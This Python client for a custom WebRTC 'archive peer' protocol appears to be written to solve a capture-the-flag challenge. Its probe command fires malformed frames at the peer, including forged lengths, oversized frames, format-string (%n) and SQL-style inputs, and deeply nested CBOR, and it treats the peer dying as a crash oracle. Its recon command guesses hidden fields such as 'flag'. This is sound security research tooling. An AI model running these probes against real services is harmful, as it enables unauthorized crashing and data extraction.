#!/usr/bin/env python3
"""slopped -- standalone client for the "archive peer" protocol.

A from-scratch replacement for the handout's `peerctl`.  It exists because
peerctl refuses to emit anything but a well-formed, size-capped frame; probing
the archive peer for the binary bug needs a client that can lie about lengths,
oversize frames, odd type/flag/stream values and arbitrary CBOR payloads.

Wire protocol (recovered from slopped/internal/protocol.Encode/.Decode and
verified against a local peer, see tools/mockpeer.py):

    offset size field
    0      4    "GMP1"                       magic
    4      1    0x01                         version
    5      1    Type        uint8            0x10 HISTORY_PULL, 0x20 CHAT
    6      2    Flags       uint16 BE        peerctl always sends 0
    8      4    StreamID    uint32 BE        peerctl always sends 1
    12     8    Sequence    uint64 BE        increments per request
    20     4    PayloadLen  uint32 BE        must equal len(frame)-24
    24     n    Payload     CBOR map         {"text":...} / {"after","limit","fields"}

    whole frame  <= 32768 bytes (peerctl side), payload <= 32744

Signalling:
    GET  <gateway>/v1/config  -> rtcbridge.PublicConfig
         {"protocol_version":1,"websocket":"wss://...","turn":{"URI","Username",
          "Password"},"peer_fingerprint":"sha256:..","channels":[...]}
    WS   <websocket>?role=guest
         client -> {"type":"ice_candidate","candidate":"<json>"}   (trickle)
         client -> {"type":"sdp_offer","sdp":"..."}
         server -> {"type":"sdp_answer","sdp":"..."}
         server -> {"type":"ice_candidate","candidate":"<json>"}
    WebRTC datachannel, label "gmp.chat.v1", in-band negotiated, ordered.

Requires:  pip install aiortc websockets cbor2
"""
import argparse
import asyncio
import json
import ssl
import struct
import sys
import urllib.request

import cbor2
from aiortc import (RTCConfiguration, RTCIceCandidate, RTCIceServer,
                    RTCPeerConnection, RTCSessionDescription)
from websockets.asyncio.client import connect as ws_connect

MAGIC = b"GMP1"
VERSION = 1
HDR = 24
MAX_FRAME = 32768
TYPE_HISTORY = 0x10
TYPE_CHAT = 0x20
CHANNEL_LABEL = "gmp.chat.v1"
ROLE_QUERY = "?role=guest"


# --------------------------------------------------------------------------
# frame codec
# --------------------------------------------------------------------------
def build_frame(ftype=TYPE_CHAT, flags=0, stream=1, seq=1, payload=None,
                cbor_bytes=None, declared_len=None):
    """Build a frame.  declared_len / cbor_bytes let you lie to the peer."""
    if cbor_bytes is None:
        cbor_bytes = cbor2.dumps(payload) if payload is not None else b""
    n = len(cbor_bytes) if declared_len is None else declared_len
    return (MAGIC + bytes([VERSION, ftype & 0xFF])
            + struct.pack(">HIQI", flags & 0xFFFF, stream & 0xFFFFFFFF,
                          seq & 0xFFFFFFFFFFFFFFFF, n & 0xFFFFFFFF)
            + cbor_bytes)


def parse_frame(buf):
    if len(buf) < HDR or buf[:4] != MAGIC:
        return {"raw": buf}
    ftype = buf[5]
    flags, stream = struct.unpack(">HI", buf[6:12])
    seq, plen = struct.unpack(">QI", buf[12:24])
    body = buf[HDR:]
    try:
        payload = cbor2.loads(body) if body else None
    except Exception as e:                              # noqa: BLE001
        payload = "<cbor decode error: %r>" % (e,)
    return {"type": ftype, "flags": flags, "stream": stream, "seq": seq,
            "declared": plen, "actual": len(body), "payload": payload}


# --------------------------------------------------------------------------
# transport
# --------------------------------------------------------------------------
def fetch_config(url, insecure=False):
    ctx = ssl._create_unverified_context() if insecure else None
    with urllib.request.urlopen(url, timeout=20, context=ctx) as r:
        return json.loads(r.read().decode())


def ice_servers(cfg):
    turn = cfg.get("turn") or {}
    uri = turn.get("URI") or turn.get("uri") or ""
    if not uri:
        return []
    return [RTCIceServer(urls=[uri], username=turn.get("Username"),
                         credential=turn.get("Password"))]


def cand_to_json(sdp_line, ufrag):
    """a=candidate line -> the JSON blob peerctl puts in {"candidate": ...}."""
    parts = sdp_line.split()
    return json.dumps({"candidate": sdp_line, "sdpMid": "0", "sdpMLineIndex": 0,
                       "usernameFragment": ufrag})


def cand_from_json(blob):
    c = json.loads(blob) if isinstance(blob, str) else blob
    fields = c["candidate"].split()
    kw = dict(component=c.get("component", 1),
              foundation=fields[0].split(":")[1],
              ip=fields[4], port=int(fields[5]),
              priority=int(fields[3]), protocol=fields[2], type=fields[7])
    if "raddr" in fields:
        kw["relatedAddress"] = fields[fields.index("raddr") + 1]
        kw["relatedPort"] = int(fields[fields.index("rport") + 1])
    if c.get("usernameFragment"):
        kw["usernameFragment"] = c["usernameFragment"]
    return RTCIceCandidate(**kw)


class Client:
    def __init__(self, cfg, insecure=False, verbose=False):
        self.cfg = cfg
        self.verbose = verbose
        self.ssl_ctx = ssl._create_unverified_context() if insecure else None
        self.pc = RTCPeerConnection(RTCConfiguration(iceServers=ice_servers(cfg)))
        self.ch = self.pc.createDataChannel(CHANNEL_LABEL, ordered=True)
        self.inbox = asyncio.Queue()
        self.ws = None
        self.pumper = None
        self.seq = 0
        self._open = asyncio.Event()

        @self.ch.on("open")
        def _open():
            self._open.set()

        @self.ch.on("message")
        def _msg(raw):
            f = parse_frame(raw if isinstance(raw, bytes) else raw.encode())
            if self.verbose:
                print("[recv] %s" % json.dumps(f, default=str), file=sys.stderr)
            self.inbox.put_nowait(f)

    async def connect(self, timeout=30):
        """Signalling + ICE + DTLS/SCTP + DCEP.  The websocket stays open: the
        peer tears the session down as soon as the signalling socket closes."""
        ws_url = self.cfg["websocket"]
        ws_url += ("&" if "?" in ws_url else "?") + ROLE_QUERY.lstrip("?")
        # websockets rejects ssl=None for a wss:// URI, so hand it a verifying
        # context unless --insecure already supplied an unverified one.
        ws_ssl = self.ssl_ctx
        if ws_ssl is None and ws_url.lower().startswith("wss://"):
            ws_ssl = ssl.create_default_context()
        self.ws = await ws_connect(ws_url, ssl=ws_ssl, open_timeout=timeout)

        await self.pc.setLocalDescription(await self.pc.createOffer())
        sent = set()

        async def trickle():
            while True:
                sdp = (self.pc.localDescription or RTCSessionDescription("", "offer")).sdp
                ufrag = ""
                for line in sdp.splitlines():
                    if line.startswith("a=ice-ufrag:"):
                        ufrag = line.split(":", 1)[1]
                    if line.startswith("a=candidate:") and line not in sent:
                        sent.add(line)
                        await self.ws.send(json.dumps(
                            {"type": "ice_candidate",
                             "candidate": cand_to_json(line[len("a="):], ufrag)}))
                if self.pc.iceGatheringState == "complete":
                    return
                await asyncio.sleep(0.05)

        await asyncio.wait_for(trickle(), timeout)
        await self.ws.send(json.dumps({"type": "sdp_offer",
                                       "sdp": self.pc.localDescription.sdp}))

        self.pumper = asyncio.ensure_future(self._pump())
        await asyncio.wait_for(self._open.wait(), timeout)

    async def _pump(self):
        try:
            async for msg in self.ws:
                obj = json.loads(msg)
                t = obj.get("type")
                if t == "sdp_answer":
                    await self.pc.setRemoteDescription(
                        RTCSessionDescription(sdp=obj["sdp"], type="answer"))
                elif t == "ice_candidate":
                    try:
                        await self.pc.addIceCandidate(cand_from_json(obj["candidate"]))
                    except Exception as e:                  # noqa: BLE001
                        if self.verbose:
                            print("[ice] %r" % (e,), file=sys.stderr)
                elif self.verbose:
                    print("[ws ] %s" % json.dumps(obj)[:200], file=sys.stderr)
        except Exception as e:                              # noqa: BLE001
            if self.verbose:
                print("[ws ] closed: %r" % (e,), file=sys.stderr)

    async def request(self, ftype, payload, timeout=20, **frame_kw):
        self.seq += 1
        frame = build_frame(ftype=ftype, seq=self.seq, payload=payload, **frame_kw)
        self.ch.send(frame)
        if self.verbose:
            print("[send] %d bytes %s" % (len(frame), frame.hex()), file=sys.stderr)
            print("[diag] id=%r state=%r buffered=%r sctp=%r"
                  % (self.ch.id, self.ch.readyState, self.ch.bufferedAmount,
                     self.ch.transport.state), file=sys.stderr)
        while True:
            f = await asyncio.wait_for(self.inbox.get(), timeout)
            if f.get("seq") == self.seq:
                return f

    async def send_raw(self, data, timeout=20, wait=True):
        self.seq += 1
        self.ch.send(data)
        if self.verbose:
            print("[raw ] %d bytes %s" % (len(data), data.hex()), file=sys.stderr)
        if not wait:
            return None
        try:
            return await asyncio.wait_for(self.inbox.get(), timeout)
        except asyncio.TimeoutError:
            return None

    async def close(self):
        try:
            await self.ws.send(json.dumps({"type": "hangup"}))
            await self.ws.close()
        except Exception:                                   # noqa: BLE001
            pass
        await self.pc.close()


# --------------------------------------------------------------------------
# commands
# --------------------------------------------------------------------------
async def cmd_chat(cli, args):
    f = await cli.request(TYPE_CHAT, {"text": args.text}, timeout=args.timeout)
    print(json.dumps(f, default=str))


async def cmd_history(cli, args):
    payload = {"limit": args.limit, "after": args.after,
               "fields": json.loads(args.fields)}
    f = await cli.request(TYPE_HISTORY, payload, timeout=args.timeout)
    print(json.dumps(f, default=str))


async def cmd_raw(cli, args):
    if args.hex:
        data = bytes.fromhex(args.hex.replace(" ", ""))
    else:
        data = build_frame(ftype=int(args.type, 0), flags=args.flags,
                           stream=args.stream, seq=args.seq or 1,
                           payload=json.loads(args.payload) if args.payload else None,
                           cbor_bytes=bytes.fromhex(args.cbor_hex) if args.cbor_hex else None,
                           declared_len=args.declared_len)
    if args.pad_to and len(data) < args.pad_to:
        data += b"\x41" * (args.pad_to - len(data))     # 'A' filler
    f = await cli.send_raw(data, timeout=args.timeout, wait=not args.no_wait)
    print(json.dumps(f, default=str) if f else "null")


async def cmd_recon(cli, args):
    """Cheap first pass: read everything the peer will say before breaking it.

    The description says the archive peer keeps the history off the server, so
    the cheapest win is a history entry that the default field list hides.
    """
    print("== chat probes ==")
    for text in ["help", "/help", "?", "flag", "list", "", "A" * 4]:
        try:
            f = await cli.request(TYPE_CHAT, {"text": text}, timeout=args.timeout)
            print("  chat %-8r -> %s" % (text, json.dumps(f.get("payload"), default=str)))
        except asyncio.TimeoutError:
            print("  chat %-8r -> (no reply)" % text)

    print("== history field guesses ==")
    guesses = [
        ["sender", "body", "sent_at"],
        ["sender", "body", "sent_at", "flag"],
        ["flag"], ["secret"], ["body"], ["*"], ["sender", "body", "id", "room",
                                                "topic", "channel", "raw", "text",
                                                "key", "note", "admin"],
    ]
    for fields in guesses:
        for limit, after in ((10, 0), (100000, -1), (1000, 0)):
            try:
                f = await cli.request(TYPE_HISTORY,
                                      {"limit": limit, "after": after, "fields": fields},
                                      timeout=args.timeout)
                print("  fields=%-70s limit=%-6s after=%-3s -> %s"
                      % (fields, limit, after, json.dumps(f.get("payload"), default=str)[:600]))
            except asyncio.TimeoutError:
                print("  fields=%-70s limit=%-6s after=%-3s -> (no reply)"
                      % (fields, limit, after))

    print("== extra payload keys ==")
    for payload in ({"limit": 10, "after": 0, "fields": ["sender"], "all": True},
                    {"limit": 10, "after": 0, "fields": ["sender"], "include_deleted": True},
                    {"limit": 10, "after": 0, "fields": ["sender"], "room": "admin"},
                    {"limit": 10, "after": 0, "fields": ["sender"], "type": "ADMIN"},
                    {"limit": 10, "after": 0, "fields": ["sender"], "role": "admin"},
                    {"limit": 10, "after": 0, "fields": ["sender"], "sql": "1=1"}):
        try:
            f = await cli.request(TYPE_HISTORY, payload, timeout=args.timeout)
            print("  %-72s -> %s" % (json.dumps(payload), json.dumps(f.get("payload"), default=str)[:400]))
        except asyncio.TimeoutError:
            print("  %-72s -> (no reply)" % json.dumps(payload))


async def cmd_probe(cli, args):
    """Fire malformed-frame probes at the peer; report ALIVE/DEAD after each.

    A probe that returns nothing is ambiguous -- the peer may have rejected the
    frame or it may have died.  Every probe is followed by a benign CHAT ping:
    if the ping also fails, the peer is gone, which is the crash oracle.
    """
    big = "A" * 4000
    probes = [
        ("baseline chat", build_frame(TYPE_CHAT, 0, 1, 1, {"text": "x"})),
        ("type=0x00", build_frame(0x00, 0, 1, 2, {"text": "x"})),
        ("type=0x11", build_frame(0x11, 0, 1, 3, {"text": "x"})),
        ("type=0x21", build_frame(0x21, 0, 1, 4, {"text": "x"})),
        ("type=0x30", build_frame(0x30, 0, 1, 5, {"text": "x"})),
        ("type=0x40", build_frame(0x40, 0, 1, 6, {"text": "x"})),
        ("type=0xff", build_frame(0xFF, 0, 1, 7, {"text": "x"})),
        ("flags=0x0001", build_frame(TYPE_CHAT, 0x0001, 1, 8, {"text": "x"})),
        ("flags=0xffff", build_frame(TYPE_CHAT, 0xFFFF, 1, 9, {"text": "x"})),
        ("stream=0", build_frame(TYPE_CHAT, 0, 0, 10, {"text": "x"})),
        ("stream=0xffffffff", build_frame(TYPE_CHAT, 0, 0xFFFFFFFF, 11, {"text": "x"})),
        ("seq=0", build_frame(TYPE_CHAT, 0, 1, 0, {"text": "x"})),
        ("seq=0xffffffffffffffff", build_frame(TYPE_CHAT, 0, 1, (1 << 64) - 1, {"text": "x"})),
        ("declared len < actual", build_frame(TYPE_CHAT, 0, 1, 12, {"text": "x"}, declared_len=1)),
        ("declared len > actual", build_frame(TYPE_CHAT, 0, 1, 13, {"text": "x"}, declared_len=4096)),
        ("declared len = 0", build_frame(TYPE_CHAT, 0, 1, 14, {"text": "x"}, declared_len=0)),
        ("declared len = -1", build_frame(TYPE_CHAT, 0, 1, 15, {"text": "x"}, declared_len=0xFFFFFFFF)),
        ("bad magic", b"XXXX" + build_frame(TYPE_CHAT, 0, 1, 16, {"text": "x"})[4:]),
        ("version 0", MAGIC + b"\x00" + build_frame(TYPE_CHAT, 0, 1, 17, {"text": "x"})[5:]),
        ("version 2", MAGIC + b"\x02" + build_frame(TYPE_CHAT, 0, 1, 18, {"text": "x"})[5:]),
        ("truncated header (12B)", build_frame(TYPE_CHAT, 0, 1, 19, {"text": "x"})[:12]),
        ("header only (24B)", build_frame(TYPE_CHAT, 0, 1, 20, None)),
        ("empty frame", b""),
        ("frame 32769 (one over cap)", build_frame(TYPE_CHAT, 0, 1, 21, {"text": "A" * 32700})),
        ("frame 65000", build_frame(TYPE_CHAT, 0, 1, 22, {"text": "A" * 64000})),
        ("chat fmt string", build_frame(TYPE_CHAT, 0, 1, 23, {"text": "%s.%s.%s.%s.%s.%s.%s.%s"})),
        ("chat %n", build_frame(TYPE_CHAT, 0, 1, 24, {"text": "%n%n%n%n"})),
        ("chat huge text", build_frame(TYPE_CHAT, 0, 1, 25, {"text": big})),
        ("chat empty payload", build_frame(TYPE_CHAT, 0, 1, 26, {})),
        ("chat no payload", build_frame(TYPE_CHAT, 0, 1, 27, None)),
        ("chat non-map cbor", build_frame(TYPE_CHAT, 0, 1, 28, None, cbor_bytes=b"\x82\x01\x02")),
        ("chat cbor array of strs", build_frame(TYPE_CHAT, 0, 1, 29, None,
                                                cbor_bytes=cbor2.dumps(["a", "b"] * 500))),
        ("history limit huge", build_frame(TYPE_HISTORY, 0, 1, 30,
                                           {"limit": 2 ** 31 - 1, "after": 0,
                                            "fields": ["sender", "body"]})),
        ("history limit -1", build_frame(TYPE_HISTORY, 0, 1, 31,
                                         {"limit": -1, "after": -1,
                                          "fields": ["sender", "body"]})),
        ("history limit 2^63", build_frame(TYPE_HISTORY, 0, 1, 32,
                                           {"limit": 2 ** 63, "after": 0,
                                            "fields": ["sender"]})),
        ("history fmt fields", build_frame(TYPE_HISTORY, 0, 1, 33,
                                           {"limit": 5, "after": 0,
                                            "fields": ["%s", "%s%s%s%s", "%n"]})),
        ("history long field", build_frame(TYPE_HISTORY, 0, 1, 34,
                                           {"limit": 5, "after": 0,
                                            "fields": ["A" * 4096]})),
        ("history many fields", build_frame(TYPE_HISTORY, 0, 1, 35,
                                            {"limit": 5, "after": 0,
                                             "fields": ["f%d" % i for i in range(2000)]})),
        ("history fields=str", build_frame(TYPE_HISTORY, 0, 1, 36,
                                           {"limit": 5, "after": 0, "fields": "sender"})),
        ("history fields=int", build_frame(TYPE_HISTORY, 0, 1, 37,
                                           {"limit": 5, "after": 0, "fields": 7})),
        ("history no fields", build_frame(TYPE_HISTORY, 0, 1, 38,
                                          {"limit": 5, "after": 0})),
        ("history no payload", build_frame(TYPE_HISTORY, 0, 1, 39, None)),
        ("history after=str", build_frame(TYPE_HISTORY, 0, 1, 40,
                                          {"limit": 5, "after": "0", "fields": ["sender"]})),
        ("history after=float", build_frame(TYPE_HISTORY, 0, 1, 41,
                                            {"limit": 5, "after": 1.5, "fields": ["sender"]})),
        ("history deep nest", build_frame(TYPE_HISTORY, 0, 1, 42,
                                          {"limit": 5, "after": 0,
                                           "fields": _nest(60)})),
        ("history non-utf8 key", build_frame(TYPE_HISTORY, 0, 1, 43, None,
                                             cbor_bytes=b"\xa2\x65limit\x05\x66fields\x81\x64\xff\xfe")),
    ]
    dead = 0
    for name, data in probes:
        cli.seq = 0
        r = await cli.send_raw(data, timeout=args.timeout, wait=True)
        alive = await _health(cli, args.timeout)
        if not alive:
            dead += 1
        print("%-30s -> %-28s peer=%s"
              % (name, json.dumps(r, default=str)[:160] if r else "no reply",
                 "ALIVE" if alive else "DEAD  <-- crash/oracle"))
        if not alive:
            print("    peer stopped answering; reconnect and re-run from here")
            break
    print("probes sent: %d, peer deaths: %d" % (len(probes) if not dead else probes.index((name, data)) + 1, dead))


def _nest(depth):
    x = "leaf"
    for _ in range(depth):
        x = [x]
    return x


async def _health(cli, timeout):
    try:
        await cli.request(TYPE_CHAT, {"text": "ping"}, timeout=timeout)
        return True
    except Exception:                                       # noqa: BLE001
        return False


def main():
    ap = argparse.ArgumentParser(description="archive peer client")
    ap.add_argument("--config", required=True, help="gateway config URL (/v1/config)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--timeout", type=float, default=20.0)
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("chat"); p.add_argument("text")
    p = sub.add_parser("history")
    p.add_argument("--limit", type=int, default=10)
    p.add_argument("--after", type=int, default=0)
    p.add_argument("--fields", default='["sender","body","sent_at"]')
    p = sub.add_parser("raw")
    p.add_argument("--hex", help="exact bytes to send")
    p.add_argument("--type", default="0x20")
    p.add_argument("--flags", type=lambda x: int(x, 0), default=0)
    p.add_argument("--stream", type=lambda x: int(x, 0), default=1)
    p.add_argument("--seq", type=int, default=None)
    p.add_argument("--payload", help="JSON object for the CBOR payload")
    p.add_argument("--cbor-hex", help="raw CBOR payload bytes")
    p.add_argument("--declared-len", type=int, default=None,
                   help="lie about the payload length field")
    p.add_argument("--pad-to", type=int, default=None,
                   help="pad the frame to N bytes (oversize probe)")
    p.add_argument("--no-wait", action="store_true")
    sub.add_parser("recon")
    sub.add_parser("probe")
    args = ap.parse_args()

    cfg = fetch_config(args.config, insecure=args.insecure)
    if args.verbose:
        print("[config] %s" % json.dumps(cfg), file=sys.stderr)

    async def run():
        cli = Client(cfg, insecure=args.insecure, verbose=args.verbose)
        try:
            await cli.connect(timeout=args.timeout)
            print("[*] datachannel open", file=sys.stderr)
            await {"chat": cmd_chat, "history": cmd_history, "raw": cmd_raw,
                   "recon": cmd_recon, "probe": cmd_probe}[args.cmd](cli, args)
        finally:
            await cli.close()

    asyncio.run(run())


if __name__ == "__main__":
    main()
